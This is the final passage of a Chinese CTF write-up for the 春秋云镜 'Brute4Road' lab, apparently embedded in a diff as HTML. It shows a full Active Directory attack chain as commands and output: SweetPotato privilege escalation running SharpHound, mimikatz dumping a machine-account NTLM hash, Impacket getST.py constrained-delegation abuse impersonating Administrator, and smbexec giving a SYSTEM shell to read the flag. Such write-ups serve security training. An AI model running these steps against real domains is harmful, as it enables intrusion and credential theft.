+</span></span><span class="line"><span class="cl">                  <span class="p">[</span><span class="mf">01</span><span class="p">]</span><span class="err">:</span> <span class="n">Intel64</span> <span class="n">Family</span> <span class="mf">6</span> <span class="n">Model</span> <span class="mf">85</span> <span class="n">Stepping</span> <span class="mf">7</span> <span class="n">GenuineIntel</span> <span class="p">~</span><span class="mf">2500</span> <span class="n">Mhz</span>  
+</span></span><span class="line"><span class="cl"><span class="n">BIOS</span> <span class="n">版本</span><span class="err">:</span>        <span class="n">SeaBIOS</span> <span class="mf">449e491</span><span class="p">,</span> <span class="mf">2014</span><span class="p">/</span><span class="mf">4</span><span class="p">/</span><span class="mf">1</span>  
+</span></span><span class="line"><span class="cl"><span class="n">Windows</span> <span class="n">目录</span><span class="err">:</span>     <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span>  
+</span></span><span class="line"><span class="cl"><span class="n">系统目录</span><span class="err">:</span>         <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span>  
+</span></span><span class="line"><span class="cl"><span class="n">启动设备</span><span class="err">:</span>         <span class="p">\</span><span class="n">Device</span><span class="p">\</span><span class="n">HarddiskVolume1</span>  
+</span></span><span class="line"><span class="cl"><span class="n">系统区域设置</span><span class="err">:</span>     <span class="nb">zh-cn</span><span class="p">;</span><span class="n">中文</span><span class="p">(</span><span class="n">中国</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">输入法区域设置</span><span class="err">:</span>   <span class="nb">zh-cn</span><span class="p">;</span><span class="n">中文</span><span class="p">(</span><span class="n">中国</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">时区</span><span class="err">:</span>             <span class="p">(</span><span class="n">UTC</span><span class="p">+</span><span class="mf">08</span><span class="err">:</span><span class="mf">00</span><span class="p">)</span> <span class="n">北京</span><span class="err">，</span><span class="n">重庆</span><span class="err">，</span><span class="n">香港特别行政区</span><span class="err">，</span><span class="n">乌鲁木齐</span>  
+</span></span><span class="line"><span class="cl"><span class="n">物理内存总量</span><span class="err">:</span>     <span class="mf">3</span><span class="p">,</span><span class="mf">950</span> <span class="n">MB</span>  
+</span></span><span class="line"><span class="cl"><span class="n">可用的物理内存</span><span class="err">:</span>   <span class="mf">1</span><span class="p">,</span><span class="mf">411</span> <span class="n">MB</span>  
+</span></span><span class="line"><span class="cl"><span class="n">虚拟内存</span><span class="err">:</span> <span class="n">最大值</span><span class="err">:</span> <span class="mf">4</span><span class="p">,</span><span class="mf">654</span> <span class="n">MB</span>  
+</span></span><span class="line"><span class="cl"><span class="n">虚拟内存</span><span class="err">:</span> <span class="n">可用</span><span class="err">:</span>   <span class="mf">1</span><span class="p">,</span><span class="mf">017</span> <span class="n">MB</span>  
+</span></span><span class="line"><span class="cl"><span class="n">虚拟内存</span><span class="err">:</span> <span class="n">使用中</span><span class="err">:</span> <span class="mf">3</span><span class="p">,</span><span class="mf">637</span> <span class="n">MB</span>  
+</span></span><span class="line"><span class="cl"><span class="n">页面文件位置</span><span class="err">:</span>     <span class="n">C:</span><span class="p">\</span><span class="n">pagefile</span><span class="p">.</span><span class="py">sys</span>  
+</span></span><span class="line"><span class="cl"><span class="n">域</span><span class="err">:</span>               <span class="n">xiaorang</span><span class="p">.</span><span class="py">lab</span>  
+</span></span><span class="line"><span class="cl"><span class="n">登录服务器</span><span class="err">:</span>       <span class="p">\\</span><span class="n">MSSQLSERVER</span>  
+</span></span><span class="line"><span class="cl"><span class="n">修补程序</span><span class="err">:</span>         <span class="n">安装了</span> <span class="mf">6</span> <span class="n">个修补程序</span><span class="err">。</span>  
+</span></span><span class="line"><span class="cl">                  <span class="p">[</span><span class="mf">01</span><span class="p">]</span><span class="err">:</span> <span class="n">KB5013625</span>  
+</span></span><span class="line"><span class="cl">                  <span class="p">[</span><span class="mf">02</span><span class="p">]</span><span class="err">:</span> <span class="n">KB4049065</span>  
+</span></span><span class="line"><span class="cl">                  <span class="p">[</span><span class="mf">03</span><span class="p">]</span><span class="err">:</span> <span class="n">KB4486129</span>  
+</span></span><span class="line"><span class="cl">                  <span class="p">[</span><span class="mf">04</span><span class="p">]</span><span class="err">:</span> <span class="n">KB4486131</span>  
+</span></span><span class="line"><span class="cl">                  <span class="p">[</span><span class="mf">05</span><span class="p">]</span><span class="err">:</span> <span class="n">KB5014026</span>  
+</span></span><span class="line"><span class="cl">                  <span class="p">[</span><span class="mf">06</span><span class="p">]</span><span class="err">:</span> <span class="n">KB5013952</span>  
+</span></span><span class="line"><span class="cl"><span class="n">网卡</span><span class="err">:</span>             <span class="n">安装了</span> <span class="mf">1</span> <span class="n">个</span> <span class="n">NIC</span><span class="err">。</span>  
+</span></span><span class="line"><span class="cl">                  <span class="p">[</span><span class="mf">01</span><span class="p">]</span><span class="err">:</span> <span class="n">Red</span> <span class="n">Hat</span> <span class="n">VirtIO</span> <span class="n">Ethernet</span> <span class="n">Adapter</span>  
+</span></span><span class="line"><span class="cl">                      <span class="n">连接名</span><span class="err">:</span>      <span class="n">以太网</span>  
+</span></span><span class="line"><span class="cl">                      <span class="n">启用</span> <span class="n">DHCP</span><span class="err">:</span>   <span class="n">是</span>  
+</span></span><span class="line"><span class="cl">                      <span class="n">DHCP</span> <span class="n">服务器</span><span class="err">:</span> <span class="mf">172.22</span><span class="p">.</span><span class="py">255</span><span class="p">.</span><span class="py">253</span>  
+</span></span><span class="line"><span class="cl">                      <span class="n">IP</span> <span class="n">地址</span>  
+</span></span><span class="line"><span class="cl">                        <span class="p">[</span><span class="mf">01</span><span class="p">]</span><span class="err">:</span> <span class="mf">172.22</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">16</span>  
+</span></span><span class="line"><span class="cl">                        <span class="p">[</span><span class="mf">02</span><span class="p">]</span><span class="err">:</span> <span class="n">fe80</span><span class="p">::</span><span class="n">f40c</span><span class="err">:</span><span class="n">c014</span><span class="err">:</span><span class="mf">4749</span><span class="err">:</span><span class="n">a945</span>  
+</span></span><span class="line"><span class="cl"><span class="nb">Hyper-V</span> <span class="n">要求</span><span class="err">:</span>     <span class="n">已检测到虚拟机监控程序</span><span class="err">。</span><span class="n">将不显示</span> <span class="nb">Hyper-V</span> <span class="n">所需的功能</span><span class="err">。</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>在域中<code>xiaorang.lab</code>，并且是<code>MSSQLSERVER</code>的机器<br>
+这里查询是否配置了委约派</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users\Public\SweetPotato-new.exe -a &#34;C:\Users\huahua\Desktop\SharpHound.exe -c all --outputdirectory  C:\Users\huahua\Desktop&#34;  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用<code>BloodHound</code>进行分析<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504202054064.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504202054064.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504202054064.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504202054064.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504202054064.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504202054064.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+这里打委约派攻击，<br>
+上传<code>mimikatz</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug  
+</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Authentication Id : 0 ; 22979 (00000000:000059c3)  
+</span></span><span class="line"><span class="cl">Session           : UndefinedLogonType from 0  
+</span></span><span class="line"><span class="cl">User Name         : (null)  
+</span></span><span class="line"><span class="cl">Domain            : (null)  
+</span></span><span class="line"><span class="cl">Logon Server      : (null)  
+</span></span><span class="line"><span class="cl">Logon Time        : 2025/4/20 14:13:18  
+</span></span><span class="line"><span class="cl">SID               :  
+</span></span><span class="line"><span class="cl">        msv :  
+</span></span><span class="line"><span class="cl">         [00000003] Primary  
+</span></span><span class="line"><span class="cl">         * Username : MSSQLSERVER$  
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG  
+</span></span><span class="line"><span class="cl">         * NTLM     : 3cc99e5b42d8fbd35f3b3883898bc14c  
+</span></span><span class="line"><span class="cl">         * SHA1     : bde131b5b522f3d9441a5d321694ea692729dfb4  
+</span></span><span class="line"><span class="cl">        tspkg :  
+</span></span><span class="line"><span class="cl">        wdigest :  
+</span></span><span class="line"><span class="cl">        kerberos :  
+</span></span><span class="line"><span class="cl">        ssp :  
+</span></span><span class="line"><span class="cl">        credman :  
+</span></span><span class="line"><span class="cl">  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到<code>MSSQLSERVER$</code>的<code>NTLM Hash 3cc99e5b42d8fbd35f3b3883898bc14c</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python3 getST.py -dc-ip 172.22.2.3 xiaorang.lab/MSSQLSERVER$ -hashes :3cc99e5b42d8fbd35f3b3883898bc14c -spn CIFS/DC.xiaorang.lab -impersonate Administrator  
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">[-] CCache file is not found. Skipping...  
+</span></span><span class="line"><span class="cl">[*] Getting TGT for user  
+</span></span><span class="line"><span class="cl">[*] Impersonating Administrator  
+</span></span><span class="line"><span class="cl">[*] Requesting S4U2self  
+</span></span><span class="line"><span class="cl">[*] Requesting S4U2Proxy  
+</span></span><span class="line"><span class="cl">[*] Saving ticket in Administrator@CIFS_DC.xiaorang.lab@XIAORANG.LAB.ccache  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>导入票据<br>
+<code>export KRB5CCNAME=Administrator@CIFS_DC.xiaorang.lab@XIAORANG.LAB.ccache</code><br>
+在<code>/etc/hosts</code>添加域<br>
+<code>172.22.2.3 DC.xiaorang.lab</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 smbexec.py -no-pass -k DC.xiaorang.lab  
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Launching semi-interactive shell - Careful what you execute  
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami  
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\f</span>lag<span class="se">\f</span>lag04.txt  
+</span></span><span class="line"><span class="cl"> <span class="c1">######:                                               ###   ######:                             ##  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">#######                         ##                   :###   #######                             ##  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">##   :##                        ##                  .####   ##   :##                            ##  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">##    ##   ##.####  ##    ##  #######    .####:     ##.##   ##    ##   .####.    :####     :###.##  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">##   :##   #######  ##    ##  #######   .######:   :#: ##   ##   :##  .######.   ######   :#######  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">#######.   ###.     ##    ##    ##      ##:  :##  .##  ##   #######:  ###  ###   #:  :##  ###  ###  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">#######.   ##       ##    ##    ##      ########  ##   ##   ######    ##.  .##    :#####  ##.  .##  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">##   :##   ##       ##    ##    ##      ########  ########  ##   ##.  ##    ##  .#######  ##    ##  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">##    ##   ##       ##    ##    ##      ##        ########  ##   ##   ##.  .##  ## .  ##  ##.  .##  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">##   :##   ##       ##:  ###    ##.     ###.  :#       ##   ##   :##  ###  ###  ##:  ###  ###  ###  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">########   ##        #######    #####   .#######       ##   ##    ##: .######.  ########  :#######  </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">######     ##         ###.##    .####    .#####:       ##   ##    ###  .####.     ###.##   :###.##  </span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Well <span class="k">done</span> hacking!  
+</span></span><span class="line"><span class="cl">This is the final flag, you deserve it!  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">flag04: flag<span class="o">{</span>4afa2f09-7339-4191-afee-ad092d04f551<span class="o">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-04-21 15:48:44">Updated on 2025-04-21&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road/" data-title="春秋云镜-Brute4Road"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/brute4road/" class="post-tag" title="Tags - Brute4Road">Brute4Road</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient/" class="post-nav-item" rel="prev" title="春秋云镜-Tsclient"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>春秋云镜-Tsclient</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.145.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.15"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line visitor order-1">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"version":"v0.3.15"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
